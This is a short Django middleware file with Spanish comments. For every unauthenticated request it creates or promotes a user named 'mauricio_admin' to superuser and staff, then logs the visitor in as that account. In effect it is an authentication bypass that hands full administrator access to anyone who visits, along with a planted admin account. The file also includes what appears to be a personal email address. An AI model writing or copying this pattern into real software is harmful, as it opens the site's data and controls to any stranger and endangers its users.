from django.contrib.auth import get_user_model
from django.utils.deprecation import MiddlewareMixin

class AutoLoginMiddleware(MiddlewareMixin):
    def process_request(self, request):
        if not request.user.is_authenticated:
            User = get_user_model()
            # Buscamos o creamos el usuario administrador directamente
            user, _ = User.objects.get_or_create(
                username="mauricio_admin", 
                defaults={"email": "mauricioatlanta@gmail.com", "is_superuser": True, "is_staff": True}
            )
            # Si ya existía, nos aseguramos de que sea superusuario
            if not user.is_superuser:
                user.is_superuser = True
                user.is_staff = True
                user.save()
            
            from django.contrib.auth import login
            login(request, user, backend='django.contrib.auth.backends.ModelBackend')
